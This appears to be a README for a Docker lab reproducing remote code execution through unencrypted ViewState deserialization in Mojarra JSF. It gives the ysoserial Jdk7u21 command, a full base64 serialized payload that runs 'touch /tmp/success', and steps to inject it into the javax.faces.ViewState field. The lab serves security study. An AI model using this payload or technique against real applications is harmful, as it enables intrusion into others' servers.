# Mojarra JSF ViewState Deserialization Vulnerability

[中文版本(Chinese version)](README.zh-cn.md)

JavaServer Faces (JSF) is a standard for building Web applications, and Mojarra is a framework that implements JSF. The Mojarra that before 2.1.29-08 and 2.0.11-04, is not configured to encrypt the ViewState, so the web application may have a serious remote code execution (RCE) vulnerability.

Reference links:

- https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html
- https://www.exploit-db.com/docs/48126
- https://www.synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf

## Setup

Execute the following command to start a JSF application which using JDK7u21 and Mojarra 2.1.28:

```
docker-compose up -d
```

After the application is started, visit `http://your-ip:8080` to see the demo page.

## Exploit

Here is the structure of ViewState that encoding without a security layer:

![](1.png)

According to this structure, we can use [ysoserial's Jdk7u21 Gadget](https://github.com/frohoff/ysoserial) to generate a payload:

```
$ java -jar ysoserial-master-SNAPSHOT.jar Jdk7u21 "touch /tmp/success" | gzip | base64 -w 0
H4sIAAVGF18AA61WzW8bRRR/Yye2Y9zmo/lsaZvQlnxAd/PlJsURbT5Ia3BIhNNUwocwXk/sbde7293ZZINEb/wBCJX/AJBoOPRCqx6QKm4tFyQkUFEluHADDhUSFz7e7G5iKwnYLV1pd2bf17z35jdv3tYv0Ghb0HWFrlPJ4aomZVT9KitcpHYpy/j32ndv33g0dCwE4FrQWpEK+Hfn3r/x0Z3b42HkmxsJAGg5dx7EE0KrryhGWbIdXTKsokRNqpSY5FKN6pKqc2bpVJNcW+OKxC3qSsusbGqUMzuNY9PlxXv61s2xMETScGBV1QtM52865Tyz0nBwFRV0W2M8jXQ3B/HV/CZnilFgNodwLjeTg8iqolEbf9tyGeG2jMsW5VlBS2WgcVWnZYbMKl6WW6peRGbrquFw0+FLlmEyi6vCaKcvKGKXK/SUa4pY/8bHsbyF3/izp6NY/GFCJEzwQkgP5Wa2Hnf9EYkt/xiQI5/d/+vul8gehbNxCMMLUZiIwqkovEigxWaWSrUVZtmqoV9KzxEgrxM4MGvoNqc6X6Gawxo/7/3w8QePfnuVQGRK1VWOk/DA4AqBhlnMAoFm3Ebm52uZ5jWktGUMBc1SNI7/AbGBl1SbwKEsd/LLQU6X6KZm0AKBRFrXmeWljKFQMrNpG75zsunL2H5CLtBCkXH75D5WUgSavM1aM6wyAWsgg5iQERMyYkL2MSF7mJC3MSF7mJDnFhdSuX2ly1pF1vdHfZdZcjaYUo55u0j1gsaslEhJrGAoThnxQ+D0Ey2PqiXfDoY/8/+dIRB/zVWYKWh2FPoJfPJk+ajpQYGX5bnlhWlXtdNIotywaivVlUM1MCdw8DReEIgGuSQw/SwymTUcS2HzqoBxIkCgJA5pAuLwXBQGCIw9BWAJnK93RyxH52qZydN5GyGu8G1LBNq9YqEaFee903a2XsvblnbQQuB4jVhwi6YULSgFrZWq9pbvZBSGMGcoGPwT6BgYzOwRSyXgZTgdh5dAworBDUcp9cq8bKLXisJsOwbDWDSYyxQC/QN7i2e1SSyTQgVNjsKYMDmOVSzLqXJ1gZpB/amKamkDi83oxPBIMpmcnBgZGR8Zm0CNvkwNkRT0QQhrKPqF72FohAiOUVF7IebREA74FZeTjCPBsXHoNpBbnsgB/EY8ogwH8ZvwBaAZJnHE0gjtKCWUz+EbFrTdiuOeYq/PDBTFrAM6PT6BLuhGjR6c+z4Ks0cCs2mPuo/ZSc/skM/c1+zzcBQ1xOwYHMflKwvEYHAn6JPIEVLNn0KYZO6A3DbyBSQv3/IUz3hBESHR663fB604xpEVghPQAk3ONbiOtoB8u3NnHRF3VkcUuqLQHYWeeu+saz+rv06VL3Q/mzsrPG8Ye+6oUzXvKNSqp3ocJnCiDlMYegXwi/krTPn301/rBP8njkn9OJ7aheM2j3/I+7ZX7W6n2F2TQwMeK8vcIODa73mYOCr8dyUsyNLO1V3pztztblHELFlsTcOgJTzs7uZP/Q97v26ZfRACkgFS4rgdlewEknJaX8dNrS7mrom94qjoE7etUV03uCcjTe9M9yheuv97c8eD6x+HIJSBRJkJ4HhIw36tuapfw3KDXV0D3zSx42vd0w16y+9qbVGlMfrw3led73yDR2Me4mK75rHGG9h+NvGSxeySoRVcM+h2Exsx0fuK9HGIrSVpkp4ZnhQnJ+auWzUyCpXHNd1/AEKwhdeSCwAA
```

Then, intercept and modify the http request from demo page, put the url-encoded payload into value of `javax.faces.ViewState` field:

![](2.png)

`touch /tmp/success` has been successfully executed:

![](3.png)
